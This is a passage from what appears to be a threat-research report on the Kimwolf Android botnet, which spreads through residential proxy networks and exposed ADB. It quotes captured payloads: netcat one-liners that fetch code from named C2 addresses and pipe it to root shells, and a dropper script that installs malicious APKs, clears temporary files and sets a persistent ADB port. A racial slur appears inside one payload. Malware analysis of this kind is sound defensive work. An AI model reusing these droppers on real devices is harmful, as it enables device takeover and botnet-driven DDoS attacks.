c-.124 1.014-.797 2.542-2.294 3.569l-.021.136 3.332 x.x.x.xC21.779 18.417 23 15.593 23 12.245z"></path><path d="M12.225 23c3.03 0 5.574-.978 7.433-2.665l-3.542-2.688c-.948.648-2.22 1.1-3.891 1.1a6.745 6.745 0 01-6.386-4.572l-.132.011-3.465 2.628-.045.124C4.043 20.531 7.835 23 12.225 23z"></path><path d="M5.84 14.175A6.65 6.65 0 015.463 12c0-.758.138-1.491.361-2.175l-.006-.147-3.508-2.67-.115.054A10.831 10.831 0 001 12c0 1.772.436 3.447 1.197 4.938l3.642-2.763z"></path><path d="M12.225 5.253c2.108 0 3.529.892 4.34 1.638l3.167-3.031C17.787 2.088 15.255 1 12.225 1 7.834 1 4.043 3.469 2.197 7.062l3.63 2.763a6.77 6.77 0 016.398-4.572z"></path></svg><span aria-hidden="true" class="pointer-events-none absolute top-full left-1/2 z-10 mt-2 flex -translate-x-1/2 items-center gap-1.5 rounded-control border border-line bg-surface px-2 py-1.5 text-caption whitespace-nowrap text-contrast-high opacity-0 transition-opacity group-hover:opacity-100 group-focus-visible:opacity-100 motion-reduce:transition-none">Google AI<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" class="size-3" data-synthient-icon="arrow-up-right"><path d="M6 18 18 6M6 6h12v12" pathLength="1"></path></svg></span></a></div></nav></div></header></section><section class="page-container pb-16 lg:pb-20"><div class="research-post-layout"><details class="research-mobile-toc"><summary>On this page</summary><ol><li data-level="2"><a href="#executive-summary">Executive Summary</a></li><li data-level="2"><a href="#background">Background</a></li><li data-level="2"><a href="#infection-through-residential-proxies">Infection through Residential Proxies</a></li><li data-level="2"><a href="#infection-demographic">Infection Demographic</a></li><li data-level="2"><a href="#kimwolf-analysis">Kimwolf Analysis</a></li><li data-level="2"><a href="#byteconnect-sdk">Byteconnect SDK</a></li><li data-level="3"><a href="#byteconnect-protocol">Byteconnect Protocol</a></li><li data-level="2"><a href="#notifying-impacted-parties">Notifying Impacted Parties</a></li><li data-level="2"><a href="#the-proxy-ecosystem">The Proxy Ecosystem</a></li><li data-level="2"><a href="#mitigation-strategies">Mitigation Strategies</a></li><li data-level="3"><a href="#proxy-providers">Proxy Providers</a></li><li data-level="3"><a href="#victims-of-kimwolf">Victims of Kimwolf</a></li><li data-level="3"><a href="#organizations">Organizations</a></li><li data-level="3"><a href="#observables-and-iocs">Observables and IOCs</a></li><li data-level="2"><a href="#conclusion">Conclusion</a></li></ol></details><article class="research-post-body"><figure class="research-article-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/20caa4a4e605fbac695a7dc2c247a69975a7ce79-1366x768.jpg?rect=43,0,1280,768&amp;w=1200&amp;h=720&amp;q=86&amp;auto=format" srcset="https://cdn.sanity.io/images/8hf8zboo/production/20caa4a4e605fbac695a7dc2c247a69975a7ce79-1366x768.jpg?rect=43%2C0%2C1280%2C768&amp;w=400&amp;h=240&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/20caa4a4e605fbac695a7dc2c247a69975a7ce79-1366x768.jpg?rect=43%2C0%2C1280%2C768&amp;w=640&amp;h=384&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/20caa4a4e605fbac695a7dc2c247a69975a7ce79-1366x768.jpg?rect=43%2C0%2C1280%2C768&amp;w=800&amp;h=480&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/20caa4a4e605fbac695a7dc2c247a69975a7ce79-1366x768.jpg?rect=43%2C0%2C1280%2C768&amp;w=1000&amp;h=600&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/20caa4a4e605fbac695a7dc2c247a69975a7ce79-1366x768.jpg?rect=43%2C0%2C1280%2C768&amp;w=1200&amp;h=720&amp;q=86&amp;auto=format 1200w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="From Proxy to Botnet" loading="eager" fetchpriority="high"></figure><div class="research-portable-content"><p class="research-portable-paragraph">Warning: To maintain the historical and technical accuracy of the systems discussed, some of the original code and documentation included below contain offensive terminology. This language is preserved only to provide a comprehensive report on the subject matter.<br/></p><section class="research-section research-portable-section" id="executive-summary"><h2>Executive Summary</h2></section><p class="research-portable-paragraph">Synthient continues to track the Kimwolf DDoS and proxy botnet with this report, delivering significant findings on the inner workings, infection chain, and reliance on the residential proxy ecosystem. Kimwolf has been highly active since early August of 2025, with substantial growth over the past four months. The Synthient’s research team assesses with high confidence that the total number of infected devices has surpassed 2 million, primarily targeting Android devices running an exposed Android Debug Bridge (ADB) service via residential proxies. These findings further reveal an expansive network of compromised TV streaming devices used by providers to obtain large pools of IP addresses.</p><p class="research-portable-paragraph">Given Kimwolf&#x27;s reliance on residential proxies for infections, we advise all proxy providers to block high-risk ports and restrict access to the local network. Users should check whether they are affected by visiting <a href="/context">synthient.com/check</a>. Infected TV boxes should be wiped or destroyed. Organizations should block connections to the referenced C2 servers and domains, and monitor network traffic for suspicious activity.</p><p class="research-portable-paragraph">Synthient expects to observe a growing interest among threat actors in gaining unrestricted access to proxy networks to infect devices, obtain network access, or access sensitive information. Kimwolf highlights the risks posed by unsecured proxy networks and their viability as an attack vector.</p><section class="research-section research-portable-section" id="background"><h2>Background</h2></section><p class="research-portable-paragraph">Kimwolf, the android variant of the Aisuru DDoS Botnet, has grown to at least 2 million compromised devices over several months through its novel exploitation of residential proxy networks. Kimwolf remains a significant threat to organizations, as it continues to launch Distributed Denial-of-Service (DDoS) attacks, with Cloudflare <a href="https://blog.cloudflare.com/ddos-threat-report-2025-q3/" target="_blank" rel="noreferrer">reporting</a> peak attack rates of 29.7 Tbps or 14.1 Bpps. Key actors involved in the Kimwolf botnet are observed monetizing the botnet through app installs, selling residential proxy bandwidth, and selling its DDoS functionality.</p><p class="research-portable-paragraph">Over the last 3 months, Synthient’s Research Team has conducted a comprehensive investigation of Kimwolf, revealing key insights into the group&#x27;s operations.</p><section class="research-section research-portable-section" id="infection-through-residential-proxies"><h2>Infection through Residential Proxies</h2></section><p class="research-portable-paragraph">Kimwolf’s rapid growth can be attributed to its targeting of vulnerable devices through its novel exploitation of residential proxy networks. Our honeypot network saw an increase in targeting of the domain <code class="research-inline-code">xd[.]resi[.]to</code> on November 12th from IPIDEAs proxy network. This domain notably resolves to <code class="research-inline-code">0[.]0[.]0[.]0,</code> which points to the device running the proxy SDK.</p><figure class="research-portable-image"><img src="https://cdn.sanity.io/images/8hf8zboo/production/9fec4b913297666efa24d4d470e38cfc9f6492d7-1999x877.png?w=1400&amp;q=86&amp;auto=format" srcSet="https://cdn.sanity.io/images/8hf8zboo/production/9fec4b913297666efa24d4d470e38cfc9f6492d7-1999x877.png?w=400&amp;q=86&amp;auto=format 400w, https://cdn.sanity.io/images/8hf8zboo/production/9fec4b913297666efa24d4d470e38cfc9f6492d7-1999x877.png?w=640&amp;q=86&amp;auto=format 640w, https://cdn.sanity.io/images/8hf8zboo/production/9fec4b913297666efa24d4d470e38cfc9f6492d7-1999x877.png?w=800&amp;q=86&amp;auto=format 800w, https://cdn.sanity.io/images/8hf8zboo/production/9fec4b913297666efa24d4d470e38cfc9f6492d7-1999x877.png?w=1000&amp;q=86&amp;auto=format 1000w, https://cdn.sanity.io/images/8hf8zboo/production/9fec4b913297666efa24d4d470e38cfc9f6492d7-1999x877.png?w=1400&amp;q=86&amp;auto=format 1400w" sizes="(min-width: 1280px) 820px, (min-width: 1024px) calc(100vw - 340px), calc(100vw - 32px)" alt="Kimwolf Scanning Infrastructure" loading="lazy" width="1999" height="877"/><figcaption>Fig 1 Kimwolf Scanning Infrastructure</figcaption></figure><figure class="research-code-block" data-code-block="true" data-code="%24%20nslookup%20xd%5B.%5Dresi%5B.%5Dto%0ANon-authoritative%20answer%3A%0AName%3A%20%20%20xd%5B.%5Dresi%5B.%5Dto%0AAddress%3A%x.x.x.x" data-code-filename="nslookup xd.resi.to"><figcaption><span class="research-code-title" title="nslookup xd.resi.to">nslookup xd.resi.to</span><span class="research-code-toolbar"><span class="research-code-language">BATCHFILE</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="nslookup xd.resi.to source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">$ nslookup xd[.]resi[.]to</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">2</span><span class="research-code-text">Non-authoritative answer:</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">3</span><span class="research-code-text">Name:   xd[.]resi[.]to</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">4</span><span class="research-code-text">Address: x.x.x.x</span></span></code></pre></figure><p class="research-portable-paragraph">Synthient’s Research Team captured the following payload on December 1st, confirming the active exploitation of residential proxy networks.</p><figure class="research-code-block" data-code-block="true" data-code="cd%20%2Fdata%2Flocal%2Ftmp%3B%20echo%20-en%20krebsfiveheadindustries%20%7C%20(toybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%208443%20%7C%7C%20busybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%208443)%20%7C%20(su%20root%20sh%20%7C%7C%20sh)%20%3E%20%2Fdev%2Fnull%202%3E%261%5Cx00%22" data-code-filename="Kimwolf Exploit.txt"><figcaption><span class="research-code-title" title="Kimwolf Exploit">Kimwolf Exploit</span><span class="research-code-toolbar"><span class="research-code-language">BATCHFILE</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="Kimwolf Exploit source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">cd /data/local/tmp; echo -en krebsfiveheadindustries | (toybox nc 93[.]95[.]112[.]53 8443 || busybox nc 93[.]95[.]112[.]53 8443) | (su root sh || sh) &gt; /dev/null 2&gt;&amp;1\x00&quot;</span></span></code></pre></figure><p class="research-portable-paragraph">This payload expands to the following bash script.</p><figure class="research-code-block" data-code-block="true" data-code="SAVE_DIR%3D%2Fdata%2Flocal%2Ftmp%0A%0A%23%20download%0Aecho%20-en%20krebsfiveheadindustries%20%7C%20(toybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%208082%20%7C%7C%20busybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%208082%20%7C%7C%20busybox1.11%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%208082)%20%3E%20%2Fdata%2Flocal%2Ftmp%2Fmreo11.apk%0Aecho%20-en%20krebsfiveheadindustries%20%7C%20(toybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%201003%20%7C%7C%20busybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%201003%20%7C%7C%20busybox1.11%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%201003)%20%3E%20%2Fdata%2Flocal%2Ftmp%2Fmreo11%0Aecho%20-en%20krebsfiveheadindustries%20%7C%20(toybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%205099%20%7C%7C%20busybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%205099%20%7C%7C%20busybox1.11%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%205099)%20%3E%20%2Fdata%2Flocal%2Ftmp%2Fmreo12%0A%0A%23%20echo%20-en%20krebsfiveheadindustries%20%7C%20(toybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%203582%20%7C%7C%20busybox%20nc%2093%5B.%5D95%5B.%5D112%5B.%5D53%203582)%20%3E%20%2Fdata%2Flocal%2Ftmp%2Fmeow57.apk%0A%0A%23%20droid%20only%0Achmod%20777%20%24SAVE_DIR%2Fmreo11%0A%24SAVE_DIR%2Fmreo11%20android-tv-v2-np%0A%0A%23%20ppsdk%0Achmod%20777%20%24SAVE_DIR%2Fmreo12%0A%24SAVE_DIR%2Fmreo12%20android-tv-v2-np%0A%0A%23%20chmod%20777%20%24SAVE_DIR%2Fmeow59%0A%23%20%24SAVE_DIR%2Fmeow59%0A%0Acmd%20package%20install%20-r%20-g%20%24SAVE_DIR%2Fmreo11.apk%0A%7C%7C%20cmd%20package%20install%20-g%20%24SAVE_DIR%2Fmreo11.apk%0A%7C%7C%20cmd%20package%20install%20%24SAVE_DIR%2Fmreo11.apk%0A%7C%7C%20pm%20install%20-g%20%24SAVE_DIR%2Fmreo11.apk%0A%7C%7C%20pm%20install%20-r%20-g%20%24SAVE_DIR%2Fmreo11.apk%0A%0Apm%20enable%20com.n2.systemservice063%0Aam%20start-foreground-service%20-n%20com.n2.systemservice063%2F.NetworkSyncService%0A%0A%23%20toto%0A%23%20cmd%20package%20install%20-g%20%24SAVE_DIR%2Fmeow57.apk%0A%23%20%7C%7C%20cmd%20package%20install%20-r%20-g%20%24SAVE_DIR%2Fmeow57.apk%0A%23%20%7C%7C%20cmd%20package%20install%20-r%20%24SAVE_DIR%2Fmeow57.apk%0A%23%20%7C%7C%20cmd%20package%20install%20%24SAVE_DIR%2Fmeow57.apk%0A%23%20%7C%7C%20pm%20install%20%24SAVE_DIR%2Fmeow57.apk%0A%0Apm%20enable%20com.n2.systemservice062%0Aam%20start-foreground-service%20-n%20com.n2.systemservice062%2F.NetworkSyncService%0A%0A%23%20clean%20up.%0Arm%20-rf%20%2Fdata%2Flocal%2Ftmp%2F*%0Asetprop%20service.adb.tcp.port%2012108%0Asetprop%20persist.adb.tcp.port%2012108%0A%0A%23%20reboot%20-f%20%7C%7C%20reboot%0A%23%20svc%20power%20reboot%0A" data-code-filename="Exploit Expanded.txt"><figcaption><span class="research-code-title" title="Exploit Expanded">Exploit Expanded</span><span class="research-code-toolbar"><span class="research-code-language">BATCHFILE</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 5v11h1" pathLength="1"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-icon="check" data-synthient-icon="check"><path d="m5 12 4.5 4.5L19 7" pathLength="1"></path></svg></button><button class="research-code-action" type="button" data-code-download="true" aria-label="Download code" title="Download code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="download"><path d="M12 3v12m-5-5 5 5 5-5" pathLength="1"></path><path d="M3 16v3l2 2h14l2-2v-3" pathLength="1"></path></svg></button></span></figcaption><pre role="region" aria-label="Exploit Expanded source code" tabindex="0"><code><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">1</span><span class="research-code-text">SAVE_DIR=/data/local/tmp</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">2</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">3</span><span class="research-code-text"># download</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">4</span><span class="research-code-text">echo -en krebsfiveheadindustries | (toybox nc 93[.]95[.]112[.]53 8082 || busybox nc 93[.]95[.]112[.]53 8082 || busybox1.11 nc 93[.]95[.]112[.]53 8082) &gt; /data/local/tmp/mreo11.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">5</span><span class="research-code-text">echo -en krebsfiveheadindustries | (toybox nc 93[.]95[.]112[.]53 1003 || busybox nc 93[.]95[.]112[.]53 1003 || busybox1.11 nc 93[.]95[.]112[.]53 1003) &gt; /data/local/tmp/mreo11</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">6</span><span class="research-code-text">echo -en krebsfiveheadindustries | (toybox nc 93[.]95[.]112[.]53 5099 || busybox nc 93[.]95[.]112[.]53 5099 || busybox1.11 nc 93[.]95[.]112[.]53 5099) &gt; /data/local/tmp/mreo12</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">7</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">8</span><span class="research-code-text"># echo -en krebsfiveheadindustries | (toybox nc 93[.]95[.]112[.]53 3582 || busybox nc 93[.]95[.]112[.]53 3582) &gt; /data/local/tmp/meow57.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">9</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">10</span><span class="research-code-text"># droid only</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">11</span><span class="research-code-text">chmod 777 $SAVE_DIR/mreo11</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">12</span><span class="research-code-text">$SAVE_DIR/mreo11 android-tv-v2-np</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">13</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">14</span><span class="research-code-text"># ppsdk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">15</span><span class="research-code-text">chmod 777 $SAVE_DIR/mreo12</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">16</span><span class="research-code-text">$SAVE_DIR/mreo12 android-tv-v2-np</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">17</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">18</span><span class="research-code-text"># chmod 777 $SAVE_DIR/meow59</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">19</span><span class="research-code-text"># $SAVE_DIR/meow59</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">20</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">21</span><span class="research-code-text">cmd package install -r -g $SAVE_DIR/mreo11.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">22</span><span class="research-code-text">|| cmd package install -g $SAVE_DIR/mreo11.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">23</span><span class="research-code-text">|| cmd package install $SAVE_DIR/mreo11.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">24</span><span class="research-code-text">|| pm install -g $SAVE_DIR/mreo11.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">25</span><span class="research-code-text">|| pm install -r -g $SAVE_DIR/mreo11.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">26</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">27</span><span class="research-code-text">pm enable com.n2.systemservice063</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">28</span><span class="research-code-text">am start-foreground-service -n com.n2.systemservice063/.NetworkSyncService</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">29</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">30</span><span class="research-code-text"># toto</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">31</span><span class="research-code-text"># cmd package install -g $SAVE_DIR/meow57.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">32</span><span class="research-code-text"># || cmd package install -r -g $SAVE_DIR/meow57.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">33</span><span class="research-code-text"># || cmd package install -r $SAVE_DIR/meow57.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">34</span><span class="research-code-text"># || cmd package install $SAVE_DIR/meow57.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">35</span><span class="research-code-text"># || pm install $SAVE_DIR/meow57.apk</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">36</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">37</span><span class="research-code-text">pm enable com.n2.systemservice062</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">38</span><span class="research-code-text">am start-foreground-service -n com.n2.systemservice062/.NetworkSyncService</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">39</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">40</span><span class="research-code-text"># clean up.</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">41</span><span class="research-code-text">rm -rf /data/local/tmp/*</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">42</span><span class="research-code-text">setprop service.adb.tcp.port 12108</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">43</span><span class="research-code-text">setprop persist.adb.tcp.port 12108</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">44</span><span class="research-code-text"> </span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">45</span><span class="research-code-text"># reboot -f || reboot</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">46</span><span class="research-code-text"># svc power reboot</span></span><span class="research-code-line"><span class="research-code-gutter" aria-hidden="true">47</span><span class="research-code-text"> </span></span></code></pre></figure><p class="research-portable-paragraph">Synthient would capture four additional payloads, each making slight adjustments to the Kimwolf botnet, either to its protocol, C2 servers, or binaries.<br/><strong class="text-contrast-high">December 11th</strong></p><figure class="research-code-block" data-code-block="true" data-code="echo%20fuckyouniggerfuckyounig%20%7C%20nc%20193%5B.%5D25%5B.%5D217%5B.%5D67%20443%20%7C%20sh" data-code-filename="code.txt"><figcaption><span class="research-code-title" title="code">code</span><span class="research-code-toolbar"><span class="research-code-language">BATCHFILE</span><button class="research-code-action" type="button" data-code-copy="true" aria-label="Copy code" title="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="2" focusable="false" aria-hidden="true" data-synthient-icon="copy"><path d="M9 8h10l2 2v9l-2 2H9l-2-2v-9Z" pathLength="1"></path><path d="M16 4V3H5L3 